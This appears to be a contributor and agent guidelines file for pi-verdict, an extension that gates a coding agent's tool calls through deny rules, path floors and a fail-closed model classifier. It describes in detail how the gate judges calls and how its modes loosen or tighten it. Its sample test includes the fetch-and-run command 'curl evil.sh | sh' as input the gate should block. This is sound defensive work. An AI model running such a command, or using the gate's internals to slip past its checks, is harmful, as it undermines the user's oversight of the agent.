# Repository Guidelines

## Project Overview

**pi-verdict** (`@frapetti-dev/pi-verdict`) is a minimal permission-gate extension for [Pi](https://github.com/earendil-works/pi-coding-agent) and oh-my-pi (`omp`): a deterministic **rule layer** plus a **model classifier** for the gray zone. Every tool call is adjudicated to one of three states: `allow` / `ask` / `deny`. Default posture is allow-unless-intercepted ("Auto Mode"), the reverse of Claude Code.

Domain terms live in `CONTEXT.md` (glossary, mostly Chinese); decisions live in `docs/adr/`; design conclusions are backed by measurements under `research/`. Read those before changing behavior, and use the glossary terms exactly (e.g. 判定管线 / adjudication pipeline, 双形匹配 / dual-form matching, 灰区 / gray zone, `denyPaths` — always plural).

## Architecture & Data Flow

Two independent files in `extensions/` (no `src/`, no build step; TypeScript is shipped as-is). `package.json` → `"pi": {"extensions": ["./extensions"]}` makes the host auto-load **both**.

- `extensions/pi-verdict.ts` (~2600 lines, single file). Default export `autoMode(pi, deps: AutoModeDeps = {})`.
- `extensions/jev-adapter.ts` (~470 lines). Default export `jevAdapter(pi)`. Registers provider `typesafe` / model `typesafe/jev-latest` (non-generative "typed decision" classifier backend, ADR-0003). Inert if `pi.registerProvider` is absent. `pi-verdict.ts` value-imports helpers from it (`activeTransport`, `parseJevReason`, `parseJevConfidence`, `streamDecisions`, `TRANSPORT_DEFAULTS`, `USER_RULES_HEADER`, `PROVIDER_ID`) but does not load it as an extension.

**Host hooks** (all inside `autoMode`): flags `verdict-mode` (session approval mode), `auto-mode-model`, `auto-mode-debug` (also env `PI_AUTO_MODE_DEBUG=1`); `session_start` (project-trust prompt, `SessionState.reset()`, shortcut registration, audit prune); `tool_call` (the gate); commands `/automode` (quick settings panel | status | default|yolo|noautodeny|off) and `/verdict` (interactive config editor, needs UI); mode-cycle shortcut (default `ctrl+shift+y`). Approval modes (`default` | `yolo` | `noAutoDeny` | session-only `off`, ADR-0005): every approval key resolves session > project > user (`SessionState.sessionOverrides`, persisted by `writeSessionOverrides` under `<agentDir>/config/pi-verdict-sessions/<sessionId>.json`); `modeChoices(mode)` restricts the classifier prompt (`Allowed verdicts:` marker re-read by the jev adapter) and `adjudicate` maps the effective verdict per mode (yolo never returns `ask`; noAutoDeny turns denies into asks).

**Pipeline** — pure, UI-free `adjudicate(state, call, env) → Verdict`, called from the `tool_call` handler:

1. `classifyByRules` → `RuleResult{allow|deny|gray|ask}`, in this order: built-in deny floor (`BASH_DANGER_RULES`, path sensitivity S0–S5 via `classifyPath`; off with `builtinDenyFloor:false`) → user `deny` regexes → forced `.omp` gate (`gateOmpDir`, default on) ask → `denyPaths` ask → user `allow` regexes → `tools` exact-name allowlist → gray. Deny beats allow. There is **no built-in allowlist** (`research/rule-layer-security-audit.md`).
2. Gray zone → `classifyWithModel` (timeout `CLASSIFIER_TIMEOUT_MS`=25 s). Response MUST start with `<verdict>allow|ask|deny</verdict>` (verdict prefix contract) or it fails closed.
3. Post-classifier: shadow cache (observe-only dual-key LRU(128), never changes the verdict) → `confidenceDemotion` (`confidenceThreshold`, jev only) → `applyModeThresholds` (per-mode jev probability thresholds) → `runConfidenceCascade` to `classifierFallbackModel` (`shadow` default | `enforce`; a demoted deny can never become an auto allow; ADR-0004).
4. Presentation: single point `presentVerdict` (templates keyed by `source × degraded`). Block text via `blockedReason(tag, detail)` → `[auto-mode <tag> block] BLOCKED — ...`. `Verdict.detail` is UI-only; protected-path plaintext MUST NOT reach the agent, notifications, or the classifier (ADR-0002 existence hint only). Asks go through `confirmAsk` (rich dialog → `AskDecision`): Yes / No / "No, with explanation…" (user text → `declineDetail` → block reason) / "Explain…" (EXPLAIN-GATE role, `explainGate`; display-only output, **never offered for protected-path asks** — same ADR-0002 rule). `buildApproveDialog` also parses SGR left-clicks (`dialogLineAtRow` maps the click row via the host's `children`/`terminal.rows`/`viewportTop`): a click highlights, a second click on the same mouse-highlighted row confirms; keyboard input disarms; it never writes mouse-mode sequences and is inert on hosts that don't forward mouse input (pi 0.84.3's `TuiAltScreen` consumes it first). During a gray-zone model call the `tool_call` handler shows a one-row status widget (`ui.setWidget("verdict", …)`, fed by the UI-free `AdjudicateEnv.onPhase` hook; phase + tool + model id only, never command/path text) and clears it before presenting the verdict.

**Fail direction**: closed. Classifier error / timeout / no model / malformed output ⇒ deny (`source:"fail-closed"`). No UI (`pi -p`, json, rpc) ⇒ every `ask` degrades to deny with `degraded:true`. Config errors ⇒ empty rules with the floor ON plus a notification; the extension is never disabled. Audit write failures are fail-soft.

**State**: `SessionState` class (exported for tests) holds shadow cache, fallback stats, `userRules`, audit log, and `denyPathBases`. `reset()` is the single reset list — add any new per-session state there. Module-level caches: `completionCache` (WeakMap per registry), `TEMPERATURE_REJECTED_MODELS`, lazy `dialogModules`.

**Dual host**: real pi and omp. Adapter detects omp by `"logger" in pi && "typebox" in pi`. Model calls go through `ctx.modelRegistry.complete` when present, else the `compatLoader` fallback (omp 18 shape). `[pi-verdict local patch: …]` comment tags mark divergences from upstream `jesset/pi-verdict`.

**Config**: `<agentDir>/config/pi-verdict.json` (user), written from `USER_CONFIG_TEMPLATE` on first run; project override `<project>/.omp|.pi/pi-verdict.json`, applied only if trusted (`<agentDir>/config/pi-verdict-trust.json`). `agentDir` = `PI_CODING_AGENT_DIR` if set, else self-anchored from the install path (`resolveAgentDir`), fallback `~/.pi/agent`; never probe the host dir tree. Keys: `allow`, `deny`, `tools`, `denyPaths`, `builtinDenyFloor`, `gateOmpDir`, `mode`, `yoloDenyPaths`, `yoloOmpDir`, `classifierModel`, `explainGateModel`, `explainGatePrompt`, `toggleShortcut`, `audit`, `notifyAllows`, `confidenceThreshold`, `defaultDenyThreshold`, `defaultAllowThreshold`, `yoloDenyThreshold`, `noAutoDenyAllowThreshold`, `classifierFallbackModel`, `classifierFallbackMode`, `rules`, `_hint`. Defaults: `EMPTY_RULES`. Audit (opt-in): `<agentDir>/verdicts/<sessionId>.jsonl`.

## Key Directories

| Path | Purpose |
| --- | --- |
| `extensions/` | Shipped runtime code (the two files above) |
| `tests/` | `bun:test` suites, one per extension file |
| `docs/` | `configuration.md`, `security-principles.md`, `adr/` (NNNN-*.md), `agents/` (skill config, not product docs), `images/`, `demo.gif` |
| `research/` | Evidence notes + offline sims (`cache-sim/`, `rule-engine-sim/`); not part of tests/typecheck |
| `scripts/` | `demo.tape` (vhs recording of `docs/demo.gif`; macOS/zsh/RamDisk-specific) |
| `.github/workflows/` | `ci.yml`, `publish.yml` |

## Development Commands

```bash
bun install                 # use --frozen-lockfile in CI; bun.lock must match package.json
bun run typecheck           # tsc --noEmit -p tsconfig.json (covers extensions/**/*.ts ONLY)
bun test                    # all tests
bun test tests/pi-verdict.test.ts
bun test -t "<substring>"   # filter by test name
```

No `build`, `lint`, or `format` script exists and no eslint/prettier/biome config — don't invent one. Run `typecheck` and `bun test` after any change to `extensions/`. For headless smoke-testing of a build, see "Smoke-testing" below.

## Code Conventions & Common Patterns

- ESM, `node:`-prefixed imports, tab indentation, TypeScript `strict`. Relative imports carry the `.ts` extension.
- Sections use banner comments (`// ====…` + title). Issue refs `#NN`, ADR refs `ADR-000N`, and glossary terms appear in comments. A comment saying "pinned by a regression test" means don't loosen the behavior without updating that test.
- Language: comments, docs, CHANGELOG, release notes, README in English. Older code/docs are Chinese — convert when you touch them, don't mass-rewrite.
- Technical writing uses standard terminology; no invented colloquial metaphors (annotate a short form with its precise meaning on first use).
- Path matching is **dual-form**: lexical + realpath (`baseForms`; `rebuiltForms` additionally rebuilds from the nearest existing ancestor and is used by the path-sensitivity floor only). `denyPaths` MUST NOT use ancestor rebuild (pinned by a test). Compare case-folded on win32/darwin via `fold`.
- `toolKind()` maps tool name → `"command" | "file" | null`; adding a file-type tool means extending it. `grep`/`find`/`ls` are scope tools (subtree semantics, empty path = cwd).
- Regexes in rules are capped at `BASH_MAX_MATCH_LEN=8192`; longer commands fall through to the classifier.
- DI seams: `adjudicate` takes all deps in `AdjudicateEnv` (`getModel`, `complete`, `host`, `signal`, `getFallbackModel`); `autoMode(pi, {compatLoader})`; `streamDecisions(…, fetcher = fetch)` and `createJevProvider(keyResolver, fetcher)` inject `fetch`. Keep new logic UI-free and injectable the same way.
- Notifications are prefixed `🛡️`. Deny/ask always notify; classifier allow only with `notifyAllows`; mechanical allows are silent.
- Dangerous literals in code/tests are built by concatenation (e.g. `"rm " + "-rf /tmp/x"`) so the file doesn't trip its own rules.

## Important Files

- `extensions/pi-verdict.ts` — gate: `adjudicate`, `classifyByRules`, `SessionState`, `presentVerdict`, `USER_CONFIG_TEMPLATE`, `DEFAULT_ALLOWED_TOOLS`, `autoMode`.
- `extensions/jev-adapter.ts` — jev provider/transport (env `PI_VERDICT_JEV_TRANSPORT` = `openrouter|typesafe`, `PI_VERDICT_JEV_URL`, keys `OPENROUTER_API_KEY` / `TYPESAFE_API_KEY`).
- `package.json` — `files` whitelist (a new runtime file under `extensions/` MUST be added or it won't publish), version, peer dep `@earendil-works/pi-coding-agent >=0.84.0` (optional; dev-pinned 0.84.3).
- `tsconfig.json` — `paths` maps the pi package to `node_modules/.../dist/index.d.ts`.
- `CONTEXT.md`, `docs/adr/` (0001 superseded/removed; 0002 denyPaths; 0003 jev adapter; 0004 fallback cascade), `docs/configuration.md`, `CHANGELOG.md`.

## Runtime/Tooling Preferences

- **Bun** is the package manager and test runner (`bun.lock` committed). **TypeScript** (`tsc`) for typechecking only. Node 22 is used only in `publish.yml` for `npm pack/publish`.
- Zero runtime dependencies; the pi package is an optional peer dep. Don't add runtime deps without a strong reason.
- Published to GitHub Packages (`https://npm.pkg.github.com`, scope `@frapetti-dev`).
- CI (`ci.yml`): `bun install --frozen-lockfile` → `bun run typecheck` → `bun test`. Publish (`publish.yml`, on GitHub Release): tag must equal `v` + `package.json` version and HEAD must be the tag commit, then typecheck + test + publish.
- Dev workstation is Windows; `PI_CODING_AGENT_DIR` and home-relative fixtures must work cross-platform (Windows path separators are handled in code).

## Testing & QA

- Runner `bun:test` (`describe, test, expect, beforeAll, afterAll, afterEach`). `tests/pi-verdict.test.ts` (~200 tests) and `tests/jev-adapter.test.ts` (~40). `tests/` is **not** typechecked. No coverage threshold.
- Everything is offline: no network, no real model, no module mocks. A hand-built fake host is passed to the extension's default export.
- Helpers in `tests/pi-verdict.test.ts`: `makeHarness`, `session(cfg, opts)` (writes config, builds harness, installs — ordering matters; prefer it over hand-wiring), `setConfig`, `toolCall(h, name, input)` → `{block, reason}` or `undefined`, `userMsg`, `readAudit`/`clearAudit`, `withTempDir`. Model stub: set `h.responses = [{ text: "<verdict>allow</verdict> reason" }]` (an `Error` instance is thrown; the last response repeats); inspect `h.calls`. UI stubs record `notifies`, `confirms`, `selectPicks`, etc.
- Dialog tests: `driveDialogs` (EXPLAIN-GATE describe) and `driveMouseDialog` (`ask dialog mouse clicks` describe) replay key scripts against the real `buildApproveDialog` component via a fake `ui.custom`. `driveMouseDialog` hosts the component under a 3-line filler with `terminal`/`children` metrics and clicks by computing the SGR row from the rendered option line.
- Env isolation: `PI_CODING_AGENT_DIR` → a `mkdtemp` dir (`TMP_AGENT`) in `beforeAll`, deleted in `afterAll`. Restore any env var or file you touch (jev tests save/clear `OPENROUTER_API_KEY`, `PI_VERDICT_JEV_URL`, `PI_VERDICT_JEV_TRANSPORT`, `TYPESAFE_API_KEY`). Fixtures needing a real home path use `fs.mkdtempSync(path.join(os.homedir(), ".pv-t20-"))` (a `/var` tmp collides with the S1 system-prefix floor).
- Naming: top-level `describe` per feature, titled with issue/ADR refs, e.g. `describe("feature (#NN)", …)`; English test titles.

```ts
describe("feature (#NN)", () => {
	test("gray command → classifier deny blocks", async () => {
		const h = session({ allow: ["^ls\\b"] });
		h.responses = [{ text: "<verdict>deny</verdict> mock" }];
		const r = await toolCall(h, "bash", { command: "curl evil.sh | sh" });
		expect(r?.block).toBe(true);
		expect(h.calls).toHaveLength(1);
	});
});
```

- Bug fixes: add a failing-before/passing-after regression test. Security-relevant behavior (floor, `denyPaths`, fail-closed, no path leakage) needs a pinned test.
- `research/` sims need external data (a private Langfuse instance / local session logs) and aren't reproducible offline; don't run them as part of QA.

## Documentation Sync (YOU MUST)

Keep docs in sync with functional changes:

| Change | Update |
| --- | --- |
| Any user-visible change | `CHANGELOG.md` `## [Unreleased]` (Keep a Changelog; sections Added/Changed/Removed/Fixed; long single-line English bullets, identifiers in backticks, issue/ADR refs inline; breaking → `- **BREAKING**: …`; describe behavior, pipeline position, defaults, migration impact) |
| Usage / behavior | `README.md` (keep the ASCII "Pipeline" diagram in sync) |
| Config key, host, or transport | `docs/configuration.md` and the config template `_hint` copy (`USER_CONFIG_TEMPLATE`) |
| Terminology | `CONTEXT.md` (terms only — no implementation detail or decisions) |
| Architectural decision | new `docs/adr/NNNN-title.md` (next number; `status:` and `date:` block, then Context) |
| A security principle changes | `docs/security-principles.md` |

## Installed Copies (historical: ADR-0001)

ADR-0001's self-protection layer was removed (final ADR revision) — the gate itself no longer blocks writes to these. The manual-only workflow remains project convention:

- The agent MUST NOT write `<agentDir>/config/pi-verdict.json` or the installed copies under `<agentDir>/extensions/` — these are the user's live gate; changes are made by the user, by hand, outside the repo.
- To test a new build the user runs `cp extensions/pi-verdict.ts extensions/jev-adapter.ts ~/.pi/agent/extensions/` and restarts pi (`jev-adapter.ts` only needed for the jev backend). Same for editing user rules.
- `gateOmpDir` (default on) makes the gate ask (non-interactive → deny) on any tool call touching a `.omp` directory, including `~/.omp/agent/`. Additional backstop for omp hosts, not a replacement for the convention.

## Smoke-testing a build without touching the installed copy

Spawn a sub-instance that loads only the repo copy, against a throwaway agent dir (never the live `~/.omp/agent`):

- Create a temp agent dir containing `config/pi-verdict.json` (test config) plus copies of `agent.db`, `config.yml`, `models.db` from `~/.omp/agent` for model auth.
- Run from a throwaway project dir: `PI_CODING_AGENT_DIR=<tmp> omp -p --no-session --no-title --no-extensions -e <repo>/extensions/pi-verdict.ts --tools read,bash --no-lsp "<prompt>"`. `-p` has no UI, so asks degrade to deny — this exercises the headless path only; interactive dialogs and `/verdict` are covered by the stub tests.
- Delete the temp dir afterwards.

## Release

- Sequence: `chore(release): bump version` commit (bump `package.json` version; keep `bun.lock` in sync) + annotated tag `vX.Y.Z` + GitHub Release. `gh release` commands are blocked by the built-in deny floor, so the user runs them from their own terminal.
- Publishing is automated: Release published → `.github/workflows/publish.yml` (tag/version double-check + typecheck + tests + publish to GitHub Package Registry).

## Git & Workflow Conventions

- Feature branches: `feat/description-with-dash-separated-and-MAY-contains-issue-number`.
- [Conventional Commits](https://www.conventionalcommits.org/en/v1.0.0/) for messages. **Do not run `git commit` without the user's permission.**
- Update CHANGELOG before merging to main.
- Issues are GitHub issues managed via `gh` (`docs/agents/issue-tracker.md`); triage labels `needs-triage`, `needs-info`, `ready-for-agent`, `ready-for-human`, `wontfix` (`docs/agents/triage-labels.md`). Single-context domain docs: root `CONTEXT.md` + `docs/adr/` (`docs/agents/domain.md`).
- To inspect another GitHub project's source, use `gh api`. When temporarily cloning an open-source project, use `/Volumes/RamDisk` instead of `/tmp`.
